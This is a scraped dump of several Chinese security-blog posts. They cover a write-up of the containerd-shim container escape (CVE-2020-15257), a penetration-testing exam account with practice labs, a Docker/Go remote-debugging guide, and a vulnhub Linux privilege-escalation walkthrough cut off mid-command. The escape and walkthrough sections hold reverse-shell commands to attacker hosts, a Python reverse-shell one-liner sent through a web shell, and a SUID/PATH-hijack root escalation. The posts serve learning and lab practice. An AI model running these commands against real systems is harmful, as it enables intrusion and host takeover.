*bundle) shimAddress(namespace string) string &#123; d := sha256.Sum256([]byte(filepath.Join(namespace, b.id))) return filepath.Join(string(filepath.Separator), &quot;containerd-shim&quot;, fmt.Sprintf(&quot;%x.sock&quot;, d))&#125; containerd/client.go at v1.4.2 · containerd/containerd · GitHub 123456789101112131415161718192021222324252627282930313233343536373839404142func WithStart(binary, address, daemonAddress, cgroup string, debug bool, exitHandler func()) Opt &#123; return func(ctx context.Context, config shim.Config) (_ shimapi.ShimService, _ io.Closer, err error) &#123; socket, err := newSocket(address) if err != nil &#123; return nil, nil, err &#125; defer socket.Close() f, err := socket.File() ... cmd, err := newCommand(binary, daemonAddress, debug, config, f, stdoutLog, stderrLog) if err != nil &#123; return nil, nil, err &#125; if err := cmd.Start(); err != nil &#123; return nil, nil, errors.Wrapf(err, &quot;failed to start shim&quot;) &#125;...func newCommand(binary, daemonAddress string, debug bool, config shim.Config, socket *os.File, stdout, stderr io.Writer) (*exec.Cmd, error) &#123; selfExe, err := os.Executable() if err != nil &#123; return nil, err &#125; args := []string&#123; &quot;-namespace&quot;, config.Namespace, &quot;-workdir&quot;, config.WorkDir, &quot;-address&quot;, daemonAddress, &quot;-containerd-binary&quot;, selfExe, &#125; ... cmd := exec.Command(binary, args...) ... cmd.ExtraFiles = append(cmd.ExtraFiles, socket) cmd.Env = append(os.Environ(), &quot;GOMAXPROCS=2&quot;)...func newSocket(address string) (*net.UnixListener, error) &#123; if len(address) &gt; 106 &#123; return nil, errors.Errorf(&quot;%q: unix socket path too long (&gt; 106)&quot;, address) &#125; l, err := net.Listen(&quot;unix&quot;, &quot;\\x00&quot;+address) 注意最后一行中，address前面加上了一个\\x00，这个就表示抽象名字空间路径的Unix域套接字。 containerd传递Unix域套接字文件描述符给containerd-shim。containerd-shim在正式启动之后，会基于父进程（也就是containerd）传递的Unix域套接字文件描述符，建立gRPC服务，对外暴露一些API用于container、task的控制： containerd/shim.proto at v1.4.2 · containerd/containerd · GitHub 1234567891011121314151617181920service Shim &#123; // State returns shim and task state information. rpc State(StateRequest) returns (StateResponse); rpc Create(CreateTaskRequest) returns (CreateTaskResponse); rpc Start(StartRequest) returns (StartResponse); rpc Delete(google.protobuf.Empty) returns (DeleteResponse); rpc DeleteProcess(DeleteProcessRequest) returns (DeleteResponse); rpc ListPids(ListPidsRequest) returns (ListPidsResponse); rpc Pause(google.protobuf.Empty) returns (google.protobuf.Empty); rpc Resume(google.protobuf.Empty) returns (google.protobuf.Empty); rpc Checkpoint(CheckpointTaskRequest) returns (google.protobuf.Empty); rpc Kill(KillRequest) returns (google.protobuf.Empty); rpc Exec(ExecProcessRequest) returns (google.protobuf.Empty); rpc ResizePty(ResizePtyRequest) returns (google.protobuf.Empty); rpc CloseIO(CloseIORequest) returns (google.protobuf.Empty); // ShimInfo returns information about the shim. rpc ShimInfo(google.protobuf.Empty) returns (ShimInfoResponse); rpc Update(UpdateTaskRequest) returns (google.protobuf.Empty); rpc Wait(WaitRequest) returns (WaitResponse);&#125; 此时，containerd-shim做为server向外提供服务，containerd做为client，调用containerd-shim提供的API实现对容器的间接管理。 抽象Unix域套接字没有权限限制，所以只能靠连接进程的UID、GID做访问控制，限定了只能是root（UID=0，GID=0）用户才能连接成功。 containerd/unixcreds_linux.go at v1.4.2 · containerd/containerd · GitHub 1234567891011121314151617181920212223242526272829// UnixSocketRequireUidGid requires specific *effective* UID/GID, rather than the real UID/GID.//// For example, if a daemon binary is owned by the root (UID 0) with SUID bit but running as an// unprivileged user (UID 1001), the effective UID becomes 0, and the real UID becomes 1001.// So calling this function with uid=0 allows a connection from effective UID 0 but rejects// a connection from effective UID 1001.//// See socket(7), SO_PEERCRED: &quot;The returned credentials are those that were in effect at the time of the call to connect(2) or socketpair(2).&quot;func UnixSocketRequireUidGid(uid, gid int) UnixCredentialsFunc &#123; return func(ucred *unix.Ucred) error &#123; return requireUidGid(ucred, uid, gid) &#125;&#125;...func UnixSocketRequireSameUser() UnixCredentialsFunc &#123; euid, egid := os.Geteuid(), os.Getegid() return UnixSocketRequireUidGid(euid, egid)&#125;...func requireUidGid(ucred *unix.Ucred, uid, gid int) error &#123; if (uid != -1 &amp;&amp; uint32(uid) != ucred.Uid) || (gid != -1 &amp;&amp; uint32(gid) != ucred.Gid) &#123; return errors.Wrap(syscall.EPERM, &quot;ttrpc: invalid credentials&quot;) &#125; return nil&#125; 通过访问/proc/net/unix文件，可以获取到当前网络命名空间下所有的Unix域套接字信息。 在默认情况下，docker run启动的容器的网络模式是bridge，容器和主机之间实现了网络隔离，所以在容器内部读取/proc/net/unix文件，看不到任何信息，如下所示： 12root@ubuntu ~# docker run -it --rm busybox cat /proc/net/unixNum RefCount Protocol Flags Type St Inode Path 但是在host模式下，由于容器和主机共享同一个网络命名空间，容器能访问到主机中的所有网络资源，所以在容器内部读取/proc/net/unix文件，显示的就是真实主机中的信息，如下所示： /var/run/docker.sock：Docker Daemon监听的Unix域套接字，用于Docker client之间通信； /run/containerd/containerd.sock：containerd监听的Unix域套接字，Docker Daemon、ctr可以通过它和containerd通信； @/containerd-shim/3d6a9ed878c586fd715d9b83158ce32b6109af11991bfad4cf55fcbdaf6fee76.sock： 这个就是上文所述的，containerd-shim监听的Unix域套接字，containerd通过它和containerd-shim通信，控制管理容器。 /var/run/docker.sock、/run/containerd/containerd.sock这两者是普通的文件路径，虽然容器共享了主机的网络命名空间，但没有共享mnt命名空间，容器和主机之间的磁盘挂载点和文件系统仍然存在隔离，所以在容器内部仍然不能通过/var/run/docker.sock、/run/containerd/containerd.sock这样的路径连接对应的Unix域套接字。 也就是说: host模式下，容器共享了主机的网络命名空间，也就能够去连接 @/containerd-shim/3d6a9ed878c586fd715d9b83158ce32b6109af11991bfad4cf55fcbdaf6fee76.sock 这一类的抽象Unix域套接字。 而且在默认情况下，容器内部的进程都是以root用户启动的，所以也能通过UnixSocketRequireSameUser的校验。 在这两者的共同作用下，容器内部的进程就可以像主机中的containerd一样，连接containerd-shim监听的抽象Unix域套接字，调用containerd-shim提供的各种API，从而实现容器逃逸。 漏洞利用推荐阅读：CVE-2020-15257 EXP 开发 ，因为与 containerd-shim 通信与dockerd通信有点不一样，构造传参麻烦些，需要知道containerd-shim的入参 下面直接用集成至 cdk 的 exp 演示 1docker run -it --net=host --name=15257 ubuntu /bin/bash 在容器内执行命令cat /proc/net/unix|grep -a “containerd-shim”，查看结果确认是否可看到抽象命名空间Unix域套接字 在攻击端监听1234端口，然后下载漏洞利用工具CDK，并将其传入容器/tmp目录下： 12docker cp cdk_linux_amd64 15257:/tmpdocker exec -it 15257 bash 运行工具，执行反弹shell命令,验证得到一个宿主机的shell: 12cd /tmp./cdk_linux_amd64 run shim-pwn reverse &lt;attacker-ip&gt; &lt;port&gt; 注：关于该漏洞在利用时出现类似以下内容的问题，可以暂时参考issue #74。 1rpc error: code = Unknown desc = OCI runtime create failed: exec: &quot;runc&quot;: executable file not found in $PATH 漏洞修复https://github.com/containerd/containerd/commit/4a4bb851f5da563ff6e68a83dc837c7699c469ad 在最新发布的1.3.9和1.4.3版本中，抽象Unix域套接字已经改成了普通文件路径的Unix域套接字 因为containerd和containerd-shim都在容器外部，所以它们之间的连接、通信不受影响；因为有mnt命名空间的隔离，所以在host模式下，容器内部也无法访问普通文件路径的Unix域套接字。也就修复了上述漏洞。 参考链接[1] https://en.wikipedia.org/wiki/Linux_namespaces [2] http://lwn.net/2001/0301/a/namespaces.php3 [3] http://lwn.net/Articles/179345/ [4] http://lwn.net/Articles/259217/ [5] http://lwn.net/Articles/187274/ [6] http://lwn.net/Articles/219794/ [7] http://lwn.net/Articles/528078/ [8] https://lkml.org/lkml/2016/3/18/564 [9] https://www.phoronix.com/scan.php?page=news_item&amp;px=Time-Namespace-In-Linux-5.6 [10] https://www.quora.com/Is-it-possible-to-kill-the-init-process-in-Linux-by-the-kill-9-command [11] https://blog.csdn.net/liumiaocn/article/details/52549196 [12] https://lwn.net/Articles/531826/ [13] https://coolshell.cn/articles/17010.html [14] https://coolshell.cn/articles/17029.html [15] https://mp.weixin.qq.com/s/49F3eZ3ZWyp1V5irxBC20Q [16] https://segmentfault.com/a/1190000006917884 [17] https://www.cnblogs.com/sammyliu/p/5886833.html [18] https://mp.weixin.qq.com/s/mSlc2RMRDe6liXb-ejtRvA [19] https://www.cnblogs.com/sammyliu/category/882904.html [20] https://mp.weixin.qq.com/s/WmSaLPnG4o4Co1xRiYCOnQ [21] https://www.cdxy.me/?p=837 [22] https://research.nccgroup.com/2020/12/10/abstract-shimmer-cve-2020-15257-host-networking-is-root-equivalent-again/","categories":[{"name":"云安全","slug":"云安全","permalink":"https://tari.moe/categories/%E4%BA%91%E5%AE%89%E5%85%A8/"},{"name":"Docker","slug":"云安全/Docker","permalink":"https://tari.moe/categories/%E4%BA%91%E5%AE%89%E5%85%A8/Docker/"}],"tags":[{"name":"云安全","slug":"云安全","permalink":"https://tari.moe/tags/%E4%BA%91%E5%AE%89%E5%85%A8/"},{"name":"Docker","slug":"Docker","permalink":"https://tari.moe/tags/Docker/"},{"name":"Linux命名空间","slug":"Linux命名空间","permalink":"https://tari.moe/tags/Linux%E5%91%BD%E5%90%8D%E7%A9%BA%E9%97%B4/"}]},{"title":"CISP-PTS考证记","slug":"2022/cisp-pts","date":"2022-08-12T04:50:02.000Z","updated":"2023-01-28T02:05:51.509Z","comments":true,"path":"/p/2022/cisp-pts/","link":"","permalink":"https://tari.moe/p/2022/cisp-pts/","excerpt":"","text":"总结CISP-PTS 国家注册渗透测试专家 介绍可戳 先来总结一下考证经历，试题难度还是有的，不过因为是报班考的（也只能通过培训机构报），所以，很多题目都在平常练习中会有涉及，考前也会有一些特训啥的，考起来也不是说特别难 截止至2023年的持证数量比例，据中国信息安全评测中心数据，目前PTS和PTE持证人数大概是 350 和 4900 左右 关于培训和考试时间，当时找了好几家培训机构，发现他们培训时间多数都是工作日的，想找周末的，最终同事找了家机构，然后一起抱团考，还可以打个折。不过考试时间，基本都是工作日的，其实也还好，考试 4 个小时，请半天假就OK 关于价格，一般在 1.6W — 2.5W 不等，我们是挑了便宜的（主要是培训时间刚好在周末，这很人性化） 关于考试题型，考的时候一共需要拿到10个key（flag），在4个综合题目中，前面两个综合体就是常规的Web题了，题目可参考 https://zhuanlan.zhihu.com/p/450746039 0X04综合大题（一）和 0X05综合大题（二）。大题考点会涉及流量转发打内网的应用 关于考试环境，以往都是线下考试，我们恰好碰上疫情改为线上考（需要双机位拍摄，一个拍自己，一个拍电脑屏幕）。是先登录到考试环境，在考试环境里的虚拟机Win和Kali上操作，Win和Kali与考试的题目处于同一个内网，只有最后一个大题有Kali，剩下的都是装有渗透工具箱的Win7，考试不出网，也不能查资料，这就是考试的难点了，啥利用方式都是要能背出来，而且只能用考试环境的工具，不过肯定是能让我们解出题目的。 关于考证周期，拿证时间一般是通过后3-4个月可以拿到，培训一般断断续续1个来月 其他事项的话，基本跟着机构老师走就OK，还有想了解的可以留言～ 练习汇总在考PTS过程中，跟着老师做了挺多练习的，我这边顺藤摸瓜，找到原题并汇总了一下～ vulhubhttps://github.com/vulhub/vulhub https://vulhub.org/#/environments/httpd/ssi-rce/ https://vulhub.org/#/environments/httpd/CVE-2017-15715/ HTTPD 换行解析 https://vulhub.org/#/environments/nginx/nginx_parsing_vulnerability/ https://vulhub.org/#/environments/nginx/insecure-configuration/ https://vulhub.org/#/environments/weblogic/CVE-2018-2894/ 测试页任意文件上传 https://vulhub.org/#/environments/tomcat/CVE-2017-12615/ PUT 任意文件写 https://vulhub.org/#/environments/mysql/CVE-2012-2122/ MySQL错误密码登陆 https://vulhub.org/#/environments/tomcat/tomcat8/ 部署waf包任意文件上传 https://vulhub.org/#/environments/weblogic/ssrf/ Weblogic SSRF https://vulhub.org/#/environments/phpmyadmin/CVE-2018-12613/ phpmyadmin 4.8.1 远程文件包含 sqli-labs靶场https://github.com/Audi-1/sqli-labs /Less-1/ 联合注入 /Less-5/ 报错注入 /Less-6/ 布尔注入 /Less-9/ 时间注入 /Less-24/ 二次注入 /Less-32/ 宽字节注入 /Less-38/ 堆叠注入 /Less-54/ 联合注入巩固（10步内注出数据） upload-labs靶场https://github.com/c0ny1/upload-labs /Pass-01/index.php 文件上传前端绕过 /Pass-02/index.php 文件上传MIME绕过 /Pass-03/index.php 文件上传phtml绕过 /Pass-04/index.php 文件上传.htaccess绕过 /Pass-10/index.php 文件上传双写绕过 /Pass-13/index.php 文件上传 图片马 Content-Type （GIF89a，FFD8FFE0）+ 文件包含 XSS靶场https://github.com/do0dl3/xss-labs level1-7 ，都可通过 &#39;&#39;;!--&quot;&quot;&lt;XSS&gt;=&amp;&#123;()&#125; fuzz一下闭合方式，第3/4关注意事件要刚好用引号括起来 Pikachuhttps://github.com/zhuifengshaonianhanlu/pikachu Pikachu File Inclusion(remote) （Pikachu是部署在本机的，记得开启一下远程包含相关配置） Pikachu 存储型XSS利用管理员Cookie登陆后台 Pikachu File Inclusion(local) 《从0到1：CTFer成长之路》配套练习 sql联合注入 (https://book.nu1l.com/tasks/#/pages/web/1.2?id=sql%e6%b3%a8%e5%85%a5-1) sql盲注 (https://book.nu1l.com/tasks/#/pages/web/1.2?id=sql%e6%b3%a8%e5%85%a5-2) 文件包含伪协议 (https://book.nu1l.com/tasks/#/pages/web/1.3?id=afr_1) PHP源码审计 代码 知识点/Web安全 文件上传-1 (https://book.nu1l.com/tasks/#/pages/web/2.3) 考试可用16进制编辑器修改zip包的文件名为目录穿越文件名，提前留好 ../ 文件名占位符号即可 包含知识点 https://vulhub.org/#/environments/httpd/apache_parsing_vulnerability/ HTTPD 多后缀解析漏洞 其他 LFI - 2016xctf index.php 简单版 题目代码 12345678910111213&lt;?phpini_set(&#x27;display_errors&#x27;,1);show_source(__file__);$user=$_GET[&#x27;user&#x27;];echo file_get_contents($user,&#x27;r&#x27;);print(&#x27;&lt;br /&gt;&#x27;);if(isset($user)&amp;&amp;(file_get_contents($user,&#x27;r&#x27;)===&#x27;the user is admin&#x27;))&#123; echo &quot;success&quot;;&#125;else&#123; echo &quot;you are not admin ! &quot;;&#125;?&gt; PHAR LFI - 题解 https://chybeta.github.io/2017/08/16/XNUCA-2017-Web%E4%B8%93%E9%A2%98%E8%B5%9B%E5%89%8D%E6%8C%87%E5%AF%BC-Document-writeup/ —— 题目代码下载 综合题练习靶场 一个综合题目练习靶场原型是https://www.vulnhub.com/entry/pwnlab-init,158/ ，不过注入更简单，提权少了提权至mike这一步 http://vulnstack.qiyuanxuetang.net/vuln/detail/2/ 红日安全靶机 https://www.vulnhub.com/entry/me-and-my-girlfriend-1,409/ https://www.vulnhub.com/entry/hacknos-os-bytesec,393/ https://www.vulnhub.com/entry/prime-1,358/","categories":[{"name":"考证","slug":"考证","permalink":"https://tari.moe/categories/%E8%80%83%E8%AF%81/"},{"name":"CISP","slug":"考证/CISP","permalink":"https://tari.moe/categories/%E8%80%83%E8%AF%81/CISP/"}],"tags":[{"name":"CISP","slug":"CISP","permalink":"https://tari.moe/tags/CISP/"}]},{"title":"Docker (远程) Debug 调试环境搭建","slug":"2022/goland-docker-debug","date":"2022-07-07T14:48:27.000Z","updated":"2022-12-25T01:40:14.126Z","comments":true,"path":"/p/2022/goland-docker-debug/","link":"","permalink":"https://tari.moe/p/2022/goland-docker-debug/","excerpt":"","text":"0x01 前言为了更深入和清晰的理解 Docker K8S 等组件漏洞的原理，通过我会选择 Debug 它们的源码进行断点调试追踪代码层面的调用逻辑。 刚开始学Go的时候一直很不理解Go的项目结构，跑或者去调试开源Go项目有隔阂感，低版本Docker因没有Go Module，采用较为原始的Go Vendor依赖管理方式，最近才开始学Go的我来说也是陌生，在加上Docker 20.10[1]项目重构之后分为多个组件（不直接用docker-ce源码是因为用新的可以一套代码新旧代码一起调），搭建起来也麻烦少许，Docker之间各个组件之间的调用方式又有点不同，导致搭建起来比较麻烦。后面学K8S这些发现调试环境搭建思路一样，一通百通，于是就总结一下。 本文环境 Goland IDE Ubuntu 18.04 相信大多数人和我一样主力机用Win或者Mac，但Docker底层依赖Linux命名空间，所以在runC层面的漏洞需要Linux环境，这里通过本机Goland远程连至Ubuntu进行。直接在Ubuntu装Goland也可以。不是Ubuntu也不要紧，只是下文中安装的依赖包名可能有点不同。 0x02 Docker架构组成调试之前，需要了解下 Docker 的组成，即组件的作用，这样有助于复现时理解漏洞所处在Docker组件 Docker 架构可分为 4 个仓库 https://github.com/docker/cli - 上图中的 Docker https://github.com/moby/moby - 即我们熟知的 Dockerd 守护进程，Docker服务 https://github.com/containerd/containerd - 包含 Containerd 和 Containerd-shim https://github.com/opencontainers/runc Docker 于 2013年开源一种可移植、灵活且易于部署的容器化项目 libcontainer，并于 2015年把代码捐赠给OCI（Open Container Initiative）以助力容器生态标准化。Contianerd 最初也是 Docker 的核心库，于 2017 年捐赠给 CNCF（Cloud Native Computing Foundation）。[2] 他们最初都为 Docker 的一部分，为更好构建云原生生态最终演变为几个不同的组件。 0x03 Goland Docker调试环境搭建因为 docker engine 需要 root 权限，请以 root 用户身份执行以下命令 Golang 安装许多漏洞环境需要的 go 版本较高，源安装较低，先手动安装 go 1wget https://go.dev/dl/go1.17.9.linux-amd64.tar.gz 解压 1tar xvf go1.17.9.linux-amd64.tar.gz -C /usr/local/ 让 go 可执行文件能在 $PATH 索引 1ln -s /usr/local/go/bin/go /usr/bin/go 命令行运行 go 能正常回显即可 Goland Docker 源码下载如0x02节介绍，要完整调试 Docker 源码，我们需要把四个仓库都拷贝下来，又因Docker低版本使用Go Vendor进行依赖管理，因此需要创建Go 项目源码结构 12345678mkdir -p /opt/docker-moby/src/github.com/dockermkdir -p /opt/docker-cli/src/github.com/dockermkdir -p /opt/docker-containerd/src/github.com/containerdmkdir -p /opt/docker-runc/src/github.com/opencontainersgit clone https://github.com/moby/moby.git /opt/docker-moby/src/github.com/docker/dockergit clone https://github.com/docker/cli.git /opt/docker-cli/src/github.com/docker/cligit clone https://github.com/containerd/containerd.git /opt/docker-containerd/src/github.com/containerd/containerdgit clone https://github.com/opencontainers/runc.git /opt/docker-runc/src/github.com/opencontainers/runc 完成后目录结构如下 123456789101112131415161718192021root@cloud_shoot /opt# tree -L 4 docker-*docker-cli└── src └── github.com └── docker └── clidocker-containerd└── src └── github.com └── containerd └── containerddocker-moby└── src └── github.com └── docker └── dockerdocker-runc└── src └── github.com └── opencontainers └── runc 这里使用 Goland 进行远程开发，通过 ssh 连接，配置好后，（如果本机环境为Linux，则直接）打开两个IDE依次打开的项目文件夹为 /opt/docker-moby/ /opt/docker-cli/ /opt/docker-containerd/ /opt/docker-runc/ 非远程调试可跳过下面这步 本地Goland Go SDK 设置不管是不是远程，都需要设置本地Go SDK，否则运行的时候会挂在编译前的本地检查阶段 一般本地安装好 Go 会自动识别，没有的话 Add SDK 指定本地安装目录或者 Download.. 直接下载即可，版本和与一开始的Golang相同，尽量不要比一开始安装的Golang版本低即可 远程调试环境搭建（本地可跳过此步骤）顺便介绍下远程调试配置方法，新建一个空项目 配置远程SFTP访问 设置SSH连接信息 设置远程项目部署目录，最后点击OK 最后从远程下载源码即可，新建项目时还有个 go.mod 是无用的，删除即可 项目设置此部配置目的是为了让本地的Goland正确识别代码依赖 这里注意因为默认 Goland 开启 Go Module，要取消 并添加项目 Project GOPATH Go Build设置 （本地可跳过此步骤）接下来配置远程Go环境，新建一个 Go Build 项目，注意 Run on 处选择SSH 因刚刚我们配置了SFTP，直接在 Existing 中选择即可 点击 Next，这一步报错无所谓，因为我远程用的是 fish shell，用 bash 的同学应该问题不大 继续点Next即可， 确保下面红线框住的3处配置正确即可 点击 Finish 即可 调试 Go 包选择配置Go 包为：github.com/docker/cli/cmd/docker，因为cli的入口为这个包，后面moby和containerd根据要调试的包选择即可。注意勾选下面的 Build on remote target PS: 这里 Run kind 一定要为 Package，因为Go包构建的基础单位就是包，而不是文件，这里如果 Build 文件也可以运行，因为当前入口 cmd 下，只有一个包，在 Build moby 时，如果 Build file 会报错（问了下ssst0n3师父） 最终点击运行即可，观察运行的路径为远程路径 点击运行右边的Debug按钮也可以正常运行，moby 和 containerd 服务的debug环境重复此步骤即可，不过有点注意事项 要先启动 containerd 在启动 dockerd 服务，因为从架构图可知，dockerd 服务依赖于 containerd 服务，否则启动异常 启动 containerd 服务前，要保证本机装有 containerd-shim 和 runc，也是重复上面的步骤，go build 一下即可，从上面运行 cli 可知，运行默认指定了 -o 选项 /opt/docker-cli/executables-4kyIqDG6jx/___10go_build_github_com_docker_cli_cmd_docker_linux ，把cntainerd-shim和runc运行后的路径文件复制一份至 /usr/bin 之类的目录即可，containerd服务启动前默认从环境变量的可执行文件目录搜索，当然也可以通过指定参数指定路径 见【一些其他问题】章节中的第3点 containerd-shim 和 runc debug 配置至此，表面上远程Debug就这么轻松的完成了，凡事就怕有但是… 细心的同学看了0x02的架构图会发现，Containerd调Containerd-shim 是通过命令行调用的，Dockerd和Containerd好说，是HTTP和gRPC服务，直接Debug启动等待请求即可触发Debug，但命令行调用，不能事前Debug启动要咋整？一开始我用了最原始的print大法 后面看了下 ssst0n3 调 kubelet的文章[3] 和搜狗团队对runc源码分析文章[4]，发现 Containerd-shim 和 runC 两个 cli 可以通过安装和启动 dlv ，通过 Goland 连接进行远程debug。原理是先写一个我们自定义的脚本替换 /usr/bin/containerd-shim 或 runc，里面包含了 dlv 启用相应命令 debug 服务监听，当 containerd 调用时，调用的是我们脚本，运行命令并阻塞在我们下的断点处，这时我们通过Goland remote debug连接即可 这里顺便给出具体的方法 设置源并安装 dlv，任意目录运行 12go env -w GOPROXY=https://mirrors.aliyun.com/goproxy/,directgo install github.com/go-delve/delve/cmd/dlv@latest 默认的 GOPATH 在 家目录/go 我这里安装到了 /root/go/bin/dlv 到 docker-runc/src/github.com/opencontainers/runc 目录执行 12# 添加调试信息，避免对一些函数进行优化内联造成调试困难make EXTRA_FLAGS=&#x27;-gcflags=&quot;all=-N -l&quot;&#x27; 把编译出来的 runc 移动到默认环境变量找到的地方，方便其他组件调用，并写一个脚本通过 dlv 去调用 12345678mv runc /usr/bin/runc.debugcat &lt;&lt;EOF &gt; /usr/bin/runc#!/bin/bash/root/go/bin/dlv --listen=:2345 --headless=true --api-version=2 --accept-multiclient exec /usr/bin/runc.debug -- $*EOFchmod +x /usr/bin/runc Goland端配置 containerd-shim 也是类似 1234567891011121314151617181920212223cd /root/docker-containerd-go/src/github.com/containerd/containerd/cmd/containerd-shimgo build -gcflags=all=&quot;-N -l&quot;mv containerd-shim /usr/bin/containerd-shim.debugcat &lt;&lt;EOF &gt; /usr/bin/containerd-shim#!/bin/bash/root/go/bin/dlv --listen=:2346 --headless=true --api-version=2 --accept-multiclient exec /usr/bin/containerd-shim.debug -- $*EOFchmod +x /usr/bin/containerd-shimcd /root/docker-containerd-go/src/github.com/containerd/containerd/cmd/containerd-shim-runc-v2go build -gcflags=all=&quot;-N -l&quot;mv containerd-shim-runc-v2 /usr/bin/containerd-shim-runc-v2.debugcat &lt;&lt;EOF &gt; /usr/bin/containerd-shim-runc-v2#!/bin/bash/root/go/bin/dlv --listen=:2347 --headless=true --api-version=2 --accept-multiclient exec /usr/bin/containerd-shim-runc-v2.debug -- $*EOFchmod +x /usr/bin/containerd-shim-runc-v2 此时我们通过 cli 发送一个请求，即可打通 dockerd containerd containerd-shim 和 runc 了 一些其他问题1、启动Dockerd问题 1failed to start daemon: error while opening volume store metadata database: time out docker 没退出干净，看残留的docker进程，然后kill掉就行 1ps -ef | grep docker 2、可能在运行的Linux上原本通过metarget之类的安装了Docker或者K8S，但它们有的时候卸载不会把containerd和runc给卸载掉，因此搭建前最后确保这些卸载干净 1apt remove containerd.io 3、在搭建 dockerd 和 containerd 服务时候可能报错如下 123456# pkg-config --cflags -- devmapperPackage devmapper was not found in the pkg-config search path.Perhaps you should add the directory containing `devmapper.pc&#x27;to the PKG_CONFIG_PATH environment variableNo package &#x27;devmapper&#x27; foundpkg-config: exit status 1 这是因为相关库没安装导致的，根据错误提示安装相应的依赖即可 1apt install libdevmapper-dev 除了这个包我还安装了这两个包 12apt install pkg-configapt install libseccomp-dev 缺的包跟操作系统有关，根据报错提示来就好啦～ 引用[1] https://github.com/docker/docker-ce [2] https://www.docker.com/resources/what-container/ [3] https://ssst0n3.github.io/post/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/%E5%AE%89%E5%85%A8%E7%A0%94%E7%A9%B6/%E5%AE%B9%E5%99%A8%E5%AE%89%E5%85%A8/%E5%AE%B9%E5%99%A8%E9%9B%86%E7%BE%A4%E5%AE%89%E5%85%A8/k8s/%E6%BA%90%E7%A0%81%E5%AE%A1%E8%AE%A1/%E5%A6%82%E4%BD%95%E5%BC%80%E5%8F%91%E5%B9%B6%E7%BC%96%E8%AF%91%E4%BB%A3%E7%A0%81/kubelet-%E8%BF%9C%E7%A8%8B%E8%B0%83%E8%AF%95.html [4] https://mp.weixin.qq.com/s/mSlc2RMRDe6liXb-ejtRvA","categories":[{"name":"云安全","slug":"云安全","permalink":"https://tari.moe/categories/%E4%BA%91%E5%AE%89%E5%85%A8/"},{"name":"Docker","slug":"云安全/Docker","permalink":"https://tari.moe/categories/%E4%BA%91%E5%AE%89%E5%85%A8/Docker/"},{"name":"开发","slug":"云安全/Docker/开发","permalink":"https://tari.moe/categories/%E4%BA%91%E5%AE%89%E5%85%A8/Docker/%E5%BC%80%E5%8F%91/"}],"tags":[{"name":"开发","slug":"开发","permalink":"https://tari.moe/tags/%E5%BC%80%E5%8F%91/"},{"name":"云安全","slug":"云安全","permalink":"https://tari.moe/tags/%E4%BA%91%E5%AE%89%E5%85%A8/"},{"name":"Docker","slug":"Docker","permalink":"https://tari.moe/tags/Docker/"}]},{"title":"vulnhub Linux提权靶机 | escalate_linux_1","slug":"2022/escalate-linux-1","date":"2022-04-04T06:51:08.000Z","updated":"2022-11-27T07:37:07.833Z","comments":true,"path":"/p/2022/escalate-linux-1/","link":"","permalink":"https://tari.moe/p/2022/escalate-linux-1/","excerpt":"","text":"我又来拔 flag了，忘了多久之间收在收藏夹里的靶机了… 之前一直想着汇总一下 linux 提权点，一直忘了，直到最近在备考 PTS，老师讲的没有给练习环境，然后有的点也没覆盖到，就想起这台尘封已久的靶机了，刚好可以巩固一下～ 靶机链接：https://www.vulnhub.com/entry/escalate_linux-1,323/ 先更改一下网络模式，默认为自动检测，我这里使用NAT，模拟真实环境中只知道某个网段不知具体IP情景 信息收集扫描存活 123456789❯ nmap -sP 192.168.192.128/24Starting Nmap 7.92 ( https://nmap.org ) at 2022-03-30 08:55 CSTNmap scan report for 192.168.192.1Host is up (0.0015s latency).Nmap scan report for 192.168.192.144Host is up (0.0050s latency).Nmap scan report for 192.168.192.136Host is up (0.0013s latency).Nmap done: 256 IP addresses (3 hosts up) scanned in 9.26 seconds 访问 192.168.192.144 为 apache ubuntu 的默认页面，与靶机介绍相符合 目录扫描发现 shell.php 1http://192.168.192.144/shell.php 端口扫描发现 12345678910111213141516❯ sudo nmap -p- -sS 192.168.192.144 --min-rate 1000Password:Starting Nmap 7.92 ( https://nmap.org ) at 2022-03-30 12:49 CSTNmap scan report for 192.168.192.144Host is up (0.00050s latency).Not shown: 65526 closed tcp ports (reset)PORT STATE SERVICE80/tcp open http111/tcp open rpcbind139/tcp open netbios-ssn445/tcp open microsoft-ds2049/tcp open nfs34637/tcp open unknown45257/tcp open unknown48491/tcp open unknown58531/tcp open unknown 获取低权限命令执行，并发现出网 1http://192.168.192.144/shell.php?cmd=whoami 反弹个shell 1http://192.168.192.144/shell.php?cmd=export RHOST=&quot;xxx.xxx.xxx.xxx&quot;;export RPORT=2233;python -c &#x27;import sys,socket,os,pty;s=socket.socket();s.connect((os.getenv(&quot;RHOST&quot;),int(os.getenv(&quot;RPORT&quot;))));[os.dup2(s.fileno(),fd) for fd in (0,1,2)];pty.spawn(&quot;/bin/bash&quot;)&#x27; 权限提升 (1)PEASS-ng 信息收集跑一下 https://github.com/carlospolop/PEASS-ng sudo 1.8.21p2 CVE-2021-4034 mysql root/root 密码已知 可尝试提权，但数据库是mysql用户启动 user3和user7 在 root 组 -rw-r–r– 1 root root 423 Jun 4 2019 /etc/exports/home/user5 *(rw,no_root_squash) 当前用户可写文件 /home/user3/.script.sh 0x01 suid提权suid文件查找 1find / -perm -u=s -type f 2&gt;/dev/null 结果 1234567891011121314151617181920212223242526/sbin/mount.nfs/sbin/mount.ecryptfs_private/sbin/mount.cifs/usr/sbin/pppd/usr/bin/gpasswd/usr/bin/pkexec/usr/bin/chsh/usr/bin/passwd/usr/bin/traceroute6.iputils/usr/bin/chfn/usr/bin/arping/usr/bin/newgrp/usr/bin/sudo/usr/lib/xorg/Xorg.wrap/usr/lib/eject/dmcrypt-get-device/usr/lib/policykit-1/polkit-agent-helper-1/usr/lib/openssh/ssh-keysign/usr/lib/dbus-1.0/dbus-daemon-launch-helper/bin/ping/bin/su/bin/ntfs-3g/bin/mount/bin/umount/bin/fusermount/home/user5/script/home/user3/shell 直接运行 /home/user3/shell 提示 1sh: 1: ./.script.sh: not found 切换至 /home/user3 目录在执行即可提权至root 1cd /home/user3 &amp;&amp; ./shell 0x02 滥用root权限 + 环境变量提权运行 /home/user5/script，看着像是 ls 命令的功能，通过Ghidra反编译一下，在Symbol Tree窗口，打开 Exports 项，一般入口函数是 main 或者 entry，原来 script 程序是通过root权限执行ls命令 12345678undefined8 main(void)&#123; setuid(0); setgid(0); system(&quot;ls&quot;); return 0;&#125; 但这里没有指定绝对路径，也就是说系统通过环境变量去获取的执行路径，只要我们新建一个ls脚本，把环境路径优先检索我们设置的目录，就可以执行我们想执行的操作了。 1234export PATH=/tmp:$PATHecho &quot;/bin/bash&quot; &gt; /tmp/lschmod 